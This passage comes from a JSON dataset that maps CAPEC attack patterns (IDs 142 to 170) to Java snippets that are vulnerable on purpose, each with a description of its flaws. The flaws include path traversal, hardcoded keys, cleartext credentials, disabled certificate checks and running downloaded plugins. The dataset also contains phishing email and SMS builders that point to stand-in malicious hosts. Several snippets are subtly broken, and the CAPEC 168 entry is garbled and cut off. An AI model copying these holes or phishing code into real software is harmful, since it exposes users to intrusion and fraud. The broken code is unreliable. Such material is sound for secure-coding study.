        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "public class DNSResolver {\n    private static final String DNS_SERVER = \"8.8.8.8\";\n    \n    public String resolveDomain(String domainName) {\n        try {\n            // Vulnerable: No verification of DNS response authenticity\n            InetAddress address = InetAddress.getByName(domainName);\n            String ipAddress = address.getHostAddress();\n            \n            // Vulnerable: Blind trust in reverse DNS lookup\n            String reverseDNS = address.getCanonicalHostName();\n            \n            // Vulnerable: No validation if the reverse DNS matches original domain\n            if (reverseDNS != null) {\n                return ipAddress;\n            }\n            \n            return null;\n        } catch (UnknownHostException e) {\n            return null;\n        }\n    }\n    \n    public boolean isValidDomain(String ipAddress) {\n        try {\n            // Vulnerable: Relying solely on reverse DNS for validation\n            InetAddress addr = InetAddress.getByName(ipAddress);\n            String hostname = addr.getHostName();\n            \n            // Vulnerable: No additional verification of DNS response\n            return hostname != null && !hostname.equals(ipAddress);\n        } catch (UnknownHostException e) {\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable DNS resolution practices by not properly validating DNS responses or verifying the authenticity of resolved addresses. It blindly trusts DNS responses and reverse DNS lookups without additional verification, making it susceptible to DNS cache poisoning attacks. The code relies on potentially compromised DNS data and doesn't implement any mechanisms to verify the trustworthiness of the DNS responses or validate that the reverse DNS matches the original domain."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "public class DocumentController {\n    @RequestMapping(\"/documents/{filename}\")\n    public ResponseEntity<Resource> getDocument(@PathVariable String filename) {\n        // No authentication or authorization check\n        File file = new File(\"/var/www/html/\" + filename);\n        \n        // Sensitive files stored under web root\n        if(file.exists()) {\n            Resource resource = new FileSystemResource(file);\n            return ResponseEntity.ok()\n                .header(HttpHeaders.CONTENT_DISPOSITION, \"attachment; filename=\" + filename)\n                .body(resource);\n        }\n        \n        // Exposing version control files\n        if(filename.contains(\".git\") || filename.contains(\".svn\")) {\n            File vcFile = new File(\"/var/www/html/.git/\" + filename);\n            return ResponseEntity.ok()\n                .body(new FileSystemResource(vcFile));\n        }\n        \n        return ResponseEntity.notFound().build();\n    }\n}",
        "description": "This vulnerable code demonstrates direct file access without proper authorization, allowing forced browsing to any file under the web root including sensitive documents and version control files. It lacks access controls and exposes internal files through direct URL manipulation."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "@RestController\n@RequestMapping(\"/api\")\npublic class ServiceController {\n    private final String ADMIN_KEY = \"secret123\";\n    \n    @GetMapping(\"/admin/services\")\n    public List<WebService> listAllServices() {\n        return getAllServicesIncludingHidden();\n    }\n    \n    @GetMapping(\"/wsdl\")\n    public String exposeWSDL() {\n        String wsdlContent = loadWSDLFromFile(\"/internal/service-definitions.wsdl\");\n        return wsdlContent; // Contains sensitive endpoint information\n    }\n    \n    @GetMapping(\"/plugin/download\")\n    public void downloadAndExecutePlugin(@RequestParam String url) {\n        URL pluginUrl = new URL(url);\n        File plugin = downloadFile(pluginUrl);\n        executePlugin(plugin); // No integrity check performed\n    }\n    \n    @GetMapping(\"/.git\")\n    public String getGitInfo() {\n        return readGitConfig(); // Exposes repository information\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to web service exposure and security controls. It includes unprotected admin endpoints, exposed WSDL files containing sensitive information, unchecked code execution from downloads, exposed version control data, and lacks proper access controls and authentication mechanisms. The endpoints are discoverable through directory scanning and could be accessed by unauthorized users."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "public class MessageProcessor {\n    private static final String WEAK_HASH_ALGO = \"MD5\";\n    \n    public static boolean verifyMessage(String message, String receivedChecksum) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(WEAK_HASH_ALGO);\n            byte[] digest = md.digest(message.getBytes());\n            String calculatedChecksum = Base64.getEncoder().encodeToString(digest);\n            \n            // Vulnerable: Simple string comparison of checksums\n            return calculatedChecksum.equals(receivedChecksum);\n        } catch (NoSuchAlgorithmException e) {\n            return true; // Vulnerable: defaults to accepting message on error\n        }\n    }\n    \n    public static void processMessage(String message, String checksum) {\n        if (verifyMessage(message, checksum)) {\n            // Process the message without additional integrity checks\n            processMessageContent(message);\n        }\n    }\n    \n    private static void processMessageContent(String message) {\n        // Process message assuming it's valid\n    }\n}",
        "description": "This code demonstrates multiple integrity validation vulnerabilities including use of a weak hash algorithm (MD5), insufficient integrity validation, and poor error handling that defaults to accepting messages. The code lacks proper message integrity enforcement and uses simple string comparison for checksums, making it vulnerable to checksum spoofing attacks."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "public class SchemaProcessor {\n    public void processXMLWithExternalSchema(String xmlContent, String schemaLocation) {\n        try {\n            SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\n            \n            // Vulnerable: Allows external schema location without validation\n            URL schemaURL = new URL(schemaLocation);\n            Schema schema = factory.newSchema(schemaURL);\n            \n            // Create validator without security features\n            Validator validator = schema.newValidator();\n            \n            // Process XML content without input validation\n            StringReader reader = new StringReader(xmlContent);\n            Source source = new StreamSource(reader);\n            validator.validate(source);\n            \n            // Vulnerable XPath query using raw input\n            XPath xpath = XPathFactory.newInstance().newXPath();\n            String query = \"//user[@id='\" + xmlContent + \"']\"; \n            xpath.evaluate(query, source);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable XML schema processing by accepting an external schema location and XML content without proper validation. It allows schema poisoning through unvalidated external schema sources, lacks XML input validation, and contains XPath injection vulnerabilities through direct concatenation of user input into XPath queries."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "public class XMLMessageProcessor {\n    private ExecutorService executor = Executors.newFixedThreadPool(100);\n\n    public void processXMLMessage(String xmlInput) {\n        try {\n            // No validation of XML input\n            DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));\n\n            // Process each node recursively without any resource limits\n            executor.submit(() -> {\n                processNode(doc.getDocumentElement());\n                // Send response over unsecured channel\n                sendResponse(\"http://destination.com\", doc.toString());\n            });\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processNode(Node node) {\n        // Recursive processing without depth limit\n        NodeList children = node.getChildNodes();\n        for(int i = 0; i < children.getLength(); i++) {\n            processNode(children.item(i));\n        }\n    }\n\n    private void sendResponse(String destination, String response) {\n        try {\n            URL url = new URL(destination);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setDoOutput(true);\n            try(OutputStream os = conn.getOutputStream()) {\n                os.write(response.getBytes(\"UTF-8\"));\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code processes XML messages without proper validation, resource limits, or throttling. It creates unbounded threads for each message, performs recursive processing without depth limits, and sends responses over an unsecured channel. The code is susceptible to XML-based DoS attacks, resource exhaustion, and information disclosure."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "public class ContentServer {\n    private String contentStore;\n    \n    public void updateContent(String newContent, String source) {\n        // No authentication or verification of content source\n        contentStore = newContent;\n    }\n    \n    public String serveContent(HttpServletRequest request) {\n        // No validation of content integrity\n        String rawContent = contentStore;\n        \n        // Vulnerable to XSS and content injection\n        response.setContentType(\"text/html\");\n        response.getWriter().write(rawContent);\n        \n        // No CSRF protection\n        if(request.getParameter(\"update\") != null) {\n            updateContent(request.getParameter(\"content\"), \n                         request.getParameter(\"source\"));\n        }\n        \n        return rawContent;\n    }\n    \n    public void sendContent(String destination) {\n        // No validation of destination or content integrity\n        URL url = new URL(destination);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setDoOutput(true);\n        conn.getOutputStream().write(contentStore.getBytes());\n    }\n}",
        "description": "This vulnerable code demonstrates content spoofing by lacking proper authentication, content validation, and integrity checks. It allows unauthorized content updates, doesn't verify content sources, fails to implement CSRF protection, and doesn't validate content integrity during transmission. The code accepts and serves raw content without sanitization and sends content to unverified destinations."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "public class TempFileProcessor {\n    public void processUserData(String userInput) {\n        try {\n            // Create temp file with user-controlled name\n            String fileName = \"/tmp/\" + userInput + \"_temp.txt\";\n            File tempFile = new File(fileName);\n            tempFile.createNewFile();\n\n            // Write sensitive data to temp file\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"Sensitive user data\");\n            writer.close();\n\n            // Process the file\n            processFile(tempFile);\n\n            // Attempt to delete the file\n            tempFile.delete();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processFile(File file) {\n        // Process file contents\n    }\n}",
        "description": "This vulnerable code creates a temporary file with a predictable name pattern based on user input, without proper permission controls or secure file handling. The file is created in a fixed directory (/tmp/) with default permissions, and its name can be influenced by user input. The code also doesn't ensure the file is properly deleted, potentially leaving sensitive data exposed. An attacker can predict the file location and name pattern to perform symlink attacks or access sensitive information."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "public class SecureFileManager {\n    private static final String DEFAULT_CONFIG_PATH = \"/etc/app/config.properties\";\n    private static final String SENSITIVE_DATA_PATH = \"/var/log/app/data/\";\n    \n    public void storeUserCredentials(String username, String password) {\n        try {\n            File configFile = new File(DEFAULT_CONFIG_PATH);\n            FileWriter writer = new FileWriter(configFile);\n            writer.write(\"username=\" + username + \"\\n\");\n            writer.write(\"password=\" + password + \"\\n\");\n            writer.close();\n            \n            // Debug information left in logs\n            File logFile = new File(SENSITIVE_DATA_PATH + \"debug.log\");\n            FileWriter logWriter = new FileWriter(logFile, true);\n            logWriter.write(\"Stored credentials for: \" + username + \":\" + password);\n            logWriter.close();\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public void cleanupOnShutdown() {\n        // Incomplete cleanup of sensitive data\n        File configFile = new File(DEFAULT_CONFIG_PATH);\n        configFile.delete();\n        // Debug logs and temporary files not properly cleaned\n    }\n}",
        "description": "This vulnerable code demonstrates storing sensitive information in well-known, predictable file system locations with inadequate access controls. It also shows improper handling of sensitive data in debug logs and incomplete cleanup during system shutdown. The code writes credentials to standard configuration directories and leaves debug information in accessible locations, making it easier for adversaries to locate and exploit sensitive information."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "public class AuthenticationService {\n    private static final String HARDCODED_API_KEY = \"abc123xyz\";\n    private static Map<String, String> sessions = new HashMap<>();\n\n    public boolean authenticate(String userId, String apiKey) {\n        // Vulnerable: Only checks if API key matches without verifying user identity\n        return apiKey.equals(HARDCODED_API_KEY);\n    }\n\n    public String createSession(String userId, String ipAddress) {\n        // Vulnerable: Creates session based on easily spoofable IP address\n        String sessionId = userId + \"-\" + ipAddress;\n        sessions.put(sessionId, userId);\n        return sessionId;\n    }\n\n    public boolean validateSession(String sessionId, String ipAddress) {\n        // Vulnerable: Assumes IP address is immutable and trustworthy\n        String[] parts = sessionId.split(\"-\");\n        return parts[1].equals(ipAddress);\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities related to identity spoofing. It uses a hardcoded API key, relies on easily spoofable IP addresses for session management, and fails to properly verify user identity. The authentication mechanism assumes certain data (IP addresses) are immutable and trustworthy, making it susceptible to spoofing attacks. There's no proper key exchange or strong authentication mechanism in place."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "public class UserAccountManager {\n    public boolean authenticateUser(String username, String role) {\n        // No validation of role format/content\n        if (role.contains(\"admin\")) {\n            return true;\n        }\n        \n        // Simple string comparison without proper format checking\n        if (username.length() > 0 && username.endsWith(\"_admin\")) {\n            return true;\n        }\n        \n        String userInput = username + \"|\" + role;\n        // No validation of input structure before parsing\n        String[] parts = userInput.split(\"\\|\");\n        if (parts.length == 2 && parts[1].toLowerCase().contains(\"superuser\")) {\n            return true;\n        }\n        \n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates improper input validation by failing to validate the format and structure of username and role inputs. It performs naive string operations without proper syntax checking, relies on untrusted inputs for security decisions, and lacks proper type validation. An attacker can bypass authentication by manipulating input formats and structures."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "public class ResourceManager {\n    private String baseUrl = \"https://legitimate-server.com\";\n\n    public String fetchResource(String resourceId, String location) {\n        // Vulnerable: No validation of location parameter\n        String requestUrl = location + \"/resources/\" + resourceId;\n        \n        try {\n            URL url = new URL(requestUrl);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            \n            // Vulnerable: No verification of server certificate or origin\n            conn.setHostnameVerifier((hostname, session) -> true);\n            \n            // Read and return resource content\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(conn.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            \n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            return response.toString();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable resource fetching system that allows location spoofing. It accepts an arbitrary location parameter without validation and doesn't verify the authenticity of the server or the communication channel. An attacker could supply a malicious server location to redirect requests to their controlled endpoint, potentially leading to data theft or manipulation. The code also disables hostname verification, making it susceptible to man-in-the-middle attacks."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "public class FileProcessor {\n    public void processUserData(String userData) {\n        try {\n            // Create temp file in web-accessible directory\n            File tempFile = new File(\"/var/www/html/temp/user_data.tmp\");\n            \n            // Write sensitive data to temp file\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"SSN: \" + userData);\n            writer.close();\n            \n            // Process data\n            Thread.sleep(1000);\n            \n            // Attempt to delete file later\n            tempFile.deleteOnExit();\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public void cacheUserCredentials(String username, String password) {\n        try {\n            File cacheFile = File.createTempFile(\"credentials\", \".cache\");\n            FileWriter writer = new FileWriter(cacheFile);\n            writer.write(username + \":\" + password);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code creates temporary files with sensitive data in web-accessible directories and with insecure permissions. It stores sensitive information like SSN and credentials in temporary files without proper access controls or encryption. The files are created with default permissions and aren't immediately deleted after use, leaving them exposed to unauthorized access."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "public class SensitiveDataTransfer {\n    public void transferUserCredentials(String username, String password) {\n        Socket socket = null;\n        try {\n            socket = new Socket(\"remote-server.com\", 8080);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            \n            // Sending sensitive data in cleartext\n            String credentials = username + \":\" + password;\n            out.println(credentials);\n            \n            // No message integrity check\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String response = in.readLine();\n            \n            // Process response without verification\n            processResponse(response);\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try { if (socket != null) socket.close(); } catch (IOException e) {}\n        }\n    }\n    \n    private void processResponse(String response) {\n        // Process the potentially compromised response\n        System.out.println(\"Received: \" + response);\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including transmission of sensitive credentials in cleartext (CWE-319), lack of encryption for sensitive data (CWE-311), and no message integrity verification (CWE-924). The code sends username and password over a plain socket connection without any encryption or security measures, making it susceptible to network sniffing attacks. Additionally, it processes received responses without verifying their integrity or authenticity."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "public class UnsecureDataTransfer {\n    public void sendSensitiveData(String username, String password) {\n        Socket socket = new Socket(\"server.com\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        \n        // Send credentials in plaintext\n        String credentials = username + \":\" + password;\n        out.println(credentials);\n        \n        // Send system information without encryption\n        String systemInfo = System.getProperty(\"os.name\") + \";\"\n            + System.getProperty(\"user.name\") + \";\"\n            + System.getProperty(\"java.home\");\n        out.println(systemInfo);\n        \n        // No rate limiting on network messages\n        for(int i = 0; i < 1000; i++) {\n            out.println(\"PING\");\n        }\n        \n        // No protection against replay attacks\n        String sessionToken = generateToken(username);\n        out.println(sessionToken);\n        \n        socket.close();\n    }\n    \n    private String generateToken(String username) {\n        return username + System.currentTimeMillis();\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including transmission of sensitive data (credentials and system information) in plaintext, lack of encryption, no rate limiting for network messages, and vulnerability to replay attacks due to simple token generation without proper cryptographic protection."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "public class LibraryLoader {\n    private static final String LIB_PATH = System.getProperty(\"java.library.path\");\n    \n    static {\n        String customPath = System.getenv(\"CUSTOM_LIB_PATH\");\n        if (customPath != null) {\n            System.setProperty(\"java.library.path\", customPath + File.pathSeparator + LIB_PATH);\n        }\n    }\n    \n    public static void loadLibrary(String libraryName) {\n        try {\n            String libPath = System.getProperty(\"java.library.path\");\n            File libFile = new File(libPath.split(File.pathSeparator)[0], libraryName);\n            System.load(libFile.getAbsolutePath());\n        } catch (UnsatisfiedLinkError e) {\n            System.loadLibrary(libraryName);\n        }\n    }\n    \n    public static void main(String[] args) {\n        String libName = args[0];\n        loadLibrary(libName);\n    }\n}",
        "description": "This code is vulnerable to library search path manipulation attacks. It allows external control of the library path through an environment variable and doesn't validate the library path or name. An attacker could set CUSTOM_LIB_PATH to point to a malicious library directory, or provide a crafted library name that exploits path traversal. The code also uses the first path in java.library.path without proper validation, potentially loading malicious libraries."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "public class VulnerableTemplateProcessor {\n    private String templateEngine;\n\n    public String processUserTemplate(String userInput, String headerValue) {\n        // Directly embedding user input in template without sanitization\n        String template = \"<div>\" + userInput + \"</div>\";\n        \n        // Unsafe header handling that could allow XSS\n        response.setHeader(\"X-Custom-Header\", headerValue);\n        \n        // Unsafe error handling that could expose script injection\n        try {\n            executeTemplate(template);\n        } catch (Exception e) {\n            return \"<html><body>Error occurred: \" + e.getMessage() + \"</body></html>\";\n        }\n        \n        // Template processing without origin validation\n        if(templateEngine != null) {\n            return templateEngine.process(template);\n        }\n        return template;\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to improper script handling and template processing. It includes unsanitized user input directly in HTML, unsafe header handling, vulnerable error page generation, and template processing without proper validation or sanitization. The code could allow XSS attacks through various vectors including template injection, header manipulation, and error messages."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "public class NetworkRouting {\n    private String serverEndpoint;\n    private boolean isSecure;\n\n    public NetworkRouting(String endpoint) {\n        this.serverEndpoint = endpoint;\n        this.isSecure = true;\n    }\n\n    public boolean establishConnection(String destination) {\n        // No validation of the destination endpoint\n        return connectToServer(destination);\n    }\n\n    public String sendMessage(String message, String routingPath) {\n        // No verification of message integrity or routing path authenticity\n        String response = \"\";\n        try {\n            Socket socket = new Socket(routingPath, 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(message);\n            \n            // Sensitive system information exposed in error messages\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            response = in.readLine();\n            socket.close();\n        } catch (Exception e) {\n            System.out.println(\"Server details: \" + serverEndpoint + \", Error: \" + e.toString());\n        }\n        return response;\n    }\n\n    private boolean connectToServer(String destination) {\n        // No verification if destination is legitimate\n        serverEndpoint = destination;\n        return true;\n    }\n}",
        "description": "This vulnerable code demonstrates a network routing implementation that fails to properly validate endpoints, verify message integrity, and protect sensitive system information. It allows arbitrary routing paths, doesn't verify message authenticity, and exposes system details in error messages. The code is susceptible to pharming attacks where communications can be redirected to malicious endpoints."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "public class OrderProcessor {\n    public double calculateTotal(HttpServletRequest request) {\n        double itemPrice = Double.parseDouble(request.getParameter(\"price\"));\n        int quantity = Integer.parseInt(request.getParameter(\"quantity\"));\n        String discountCode = request.getParameter(\"discount\");\n        \n        // Calculate total directly using client-provided values\n        double total = itemPrice * quantity;\n        \n        if(discountCode != null) {\n            if(discountCode.equals(\"SPECIAL10\")) {\n                total = total * 0.9;  // 10% discount\n            }\n        }\n        \n        // Store order details in hidden form fields\n        request.setAttribute(\"finalPrice\", total);\n        return total;\n    }\n    \n    public void processOrder(HttpServletRequest request) {\n        double finalPrice = Double.parseDouble(request.getParameter(\"finalPrice\"));\n        String userId = request.getParameter(\"userId\");\n        \n        // Process payment using client-provided final price\n        processPayment(userId, finalPrice);\n    }\n    \n    private void processPayment(String userId, double amount) {\n        // Payment processing logic\n    }\n}",
        "description": "This vulnerable code demonstrates client-side price manipulation vulnerability in an e-commerce application. The code blindly trusts price, quantity, and discount values received from client-side form submissions without server-side validation against authorized values. It stores sensitive pricing information in hidden form fields and uses these potentially tampered values for payment processing."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "public class EmailService {\n    public void sendAuthenticationEmail(String userEmail) {\n        String redirectUrl = \"https://legitimate-looking-site.com/auth\";\n        String companyLogo = \"https://attacker-controlled.com/company-logo.png\";\n        \n        String emailContent = String.format(\n            \"<html><body>\"+\n            \"<img src='%s' alt='Company Logo'>\"+\n            \"<p>Dear Valued Employee,</p>\"+\n            \"<p>Your account requires immediate verification. Please click the link below:</p>\"+\n            \"<a href='%s/redirect?url=%s&token=%s' target='_blank'>Verify Account</a>\"+\n            \"<script>window.opener.location = 'https://malicious-site.com';</script>\"+\n            \"</body></html>\",\n            companyLogo,\n            \"https://company-internal.com\",\n            redirectUrl,\n            generateFakeToken(userEmail)\n        );\n        \n        sendEmail(userEmail, \"Account Verification Required\", emailContent);\n    }\n    \n    private String generateFakeToken(String userEmail) {\n        return Base64.getEncoder().encodeToString(userEmail.getBytes());\n    }\n    \n    private void sendEmail(String to, String subject, String content) {\n        // Implementation to send email\n    }\n}",
        "description": "This code demonstrates a spear phishing attack implementation that creates deceptive authentication emails. It includes multiple vulnerabilities: open URL redirection, cross-domain resource loading, UI misrepresentation through fake logos, and window.opener manipulation. The email appears legitimate but contains malicious elements that can compromise user security."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "public class MobileAuthenticationService {\n    private int loginAttempts = 0;\n    \n    public boolean authenticateUser(String phoneNumber, String password) {\n        // No rate limiting implemented\n        loginAttempts++;\n        \n        // Single factor authentication using only password\n        if(password.equals(\"stored_password\")) {\n            return true;\n        }\n        return false;\n    }\n    \n    public void sendSMSAuthentication(String phoneNumber) {\n        String message = \"Security Alert: Click here to verify your account: \"\n            + \"http://bank-verify.malicious-domain.com/login?phone=\" + phoneNumber;\n        \n        // No validation of SMS origin or content\n        SMSService.send(phoneNumber, message);\n    }\n    \n    public void displayLoginPrompt() {\n        // UI doesn't properly indicate secure/insecure connection\n        JFrame frame = new JFrame(\"Bank Login\");\n        JTextField userField = new JTextField(\"Enter Phone Number\");\n        JPasswordField passField = new JPasswordField();\n        frame.add(userField);\n        frame.add(passField);\n        frame.setVisible(true);\n    }\n}",
        "description": "This vulnerable code demonstrates a mobile authentication system with multiple security flaws: no brute force protection, single-factor authentication, improper SMS security validation, and misleading UI elements. It allows unlimited login attempts, uses only password-based authentication, sends unsecured SMS with phishing links, and doesn't properly indicate security status in the UI."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "public class FileHandler {\n    public void processUploadedFile(String fileName, String uploadPath) {\n        String filePath = uploadPath + fileName;\n        File uploadedFile = new File(filePath);\n\n        // Determine file type by extension\n        if(fileName.toLowerCase().endsWith(\".txt\")) {\n            // Process as text file\n            ProcessBuilder pb = new ProcessBuilder(\"notepad.exe\", filePath);\n            pb.start();\n        } else if(fileName.toLowerCase().endsWith(\".exe\")) {\n            // Directly execute the file\n            Runtime.getRuntime().exec(filePath);\n        }\n\n        // Create temporary file with sensitive data\n        File tempFile = new File(System.getProperty(\"java.io.tmpdir\") + \"/temp_\" + fileName);\n        FileWriter writer = new FileWriter(tempFile);\n        writer.write(\"sensitive data\");\n        writer.close();\n    }\n}",
        "description": "This vulnerable code demonstrates multiple file manipulation vulnerabilities including path traversal (CWE-22), unsafe file handling (CWE-73), reliance on file extensions (CWE-646), insecure temporary file usage (CWE-377), and resource injection (CWE-99). The code accepts a file name without proper validation, relies on file extensions for processing decisions, creates an insecure temporary file, and executes files based on user input."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "public class SecuritySystem {\n    private boolean isAuthenticated = false;\n    private boolean isLocked = true;\n    private int securityLevel = 3;\n    \n    public void powerSaveMode() {\n        // Incorrect handling of state during power transitions\n        isLocked = false;\n        securityLevel = 0;  // Default value not properly preserved\n    }\n    \n    public void restoreFromPowerSave() {\n        // No verification of previous state\n        // No re-authentication required\n        isAuthenticated = true;\n    }\n    \n    public void resetConfiguration() {\n        // No authentication check for critical function\n        isLocked = false;\n        securityLevel = 1;  // Insecure default value\n    }\n    \n    public void updateSecuritySettings(int newLevel) {\n        if (!isLocked) {\n            // Missing validation of power state\n            // Missing verification of authentication\n            securityLevel = newLevel;\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable state management during power transitions and resets. It fails to properly authenticate critical operations, doesn't preserve security settings during power state changes, and allows configuration resets without proper validation. The security state can be manipulated through power transitions and resets, with improper handling of authentication state and security parameters."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "public class SystemDebugger {\n    private static final String DEBUG_KEY = \"debug123\";\n    private static boolean debugMode = false;\n    \n    static {\n        // Embedded debug backdoor\n        System.loadLibrary(\"debug_native\");\n    }\n\n    public static void enableDebugMode(String key) {\n        if(key.equals(DEBUG_KEY)) {\n            debugMode = true;\n            // Expose system information through debug trace\n            System.out.println(\"System Info: \" + System.getProperties());\n            System.out.println(\"ENV Variables: \" + System.getenv());\n            \n            // Store sensitive trace data in temp file\n            try {\n                FileWriter fw = new FileWriter(\"/tmp/debug_trace.log\");\n                fw.write(\"Memory: \" + Runtime.getRuntime().totalMemory());\n                fw.write(\"\\nThreads: \" + Thread.getAllStackTraces());\n                fw.close();\n            } catch(IOException e) {}\n        }\n    }\n\n    public native void modifyRuntimeState();\n    \n    public void analyzeSystem() {\n        if(debugMode) {\n            // Expose internal state through debug interface\n            modifyRuntimeState();\n            dumpProcessMemory();\n        }\n    }\n\n    private void dumpProcessMemory() {\n        // Implementation intentionally exposed\n    }\n}",
        "description": "This vulnerable code demonstrates white box analysis vulnerabilities by implementing a debug interface that exposes sensitive system information, stores trace data in unprotected locations, and includes potentially malicious native code functionality. The code allows runtime modification of system state through debug features and exposes internal system details through improper debug logging."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "\"import java.io.*;\nimport java.nio.file.*;\n\npublic class FileHandler {\n    public static void processFile(String filePath) {\n        try {\n            // Open and read the main file stream\n            FileInputStream fis = new FileInputStream(filePath);\n            byte[] data = fis.readFileContents();\n            fis.close();\n\n            // Process sensitive data\n            String sensitiveInfo = processSensitiveData(data);\n\n            // Write to alternate data stream without proper cleanup\n            String adsPath = filePath + \\\":secretData\\\";\n            FileOutputStream fos = new FileOutputStream(adsPath);\n            fos.write(sensitiveInfo.getBytes());\n            fos.close();\n\n            // Search for files in uncontrolled path\n            String searchPath = System.getenv(\\\"PATH\\\");\n            File[] files = new File(searchPath).listFiles();\n            \n            // Process files without checking for junctions/mount points\n            for(File file : files) {\n                if(file.getName().endsWith(\\\".dat\\\")) {\n                    processDataFile(file.getAbsolutePath());",
        "description": "\"This vulnerable code demonstrates several security issues related to Windows file handling and alternate data streams. It writes sensitive data to an NTFS alternate data stream without proper cleanup, processes files without validating if they're junctions or mount points, and uses an uncontrolled search path. The code doesn't properly handle Windows 8.3 filenames and fails to securely manage sensitive information in file operations.\""
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "public class UserAuthenticator {\n    private Map<String, String> users = new HashMap<>();\n\n    public boolean authenticateUser(String username, String password) {\n        if (!users.containsKey(username)) {\n            System.out.println(\"User not found: \" + username);\n            return false;\n        }\n\n        long startTime = System.nanoTime();\n        boolean isValid = users.get(username).equals(password);\n        long endTime = System.nanoTime();\n\n        if ((endTime - startTime) > 1000000) {\n            System.out.println(\"Debug: Password comparison took \" + (endTime - startTime) + \" ns\");\n        }\n\n        return isValid;\n    }\n\n    public void addUser(String username, String password) {\n        users.put(username, password);\n        System.out.println(\"Added user with hash: \" + password.hashCode());\n    }\n}",
        "description": "This code demonstrates vulnerable information exposure through timing differences and debug messages. It leaks information about user existence, password hash values, and processing time, allowing attackers to probe the system and gather intelligence about internal operations and user data."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
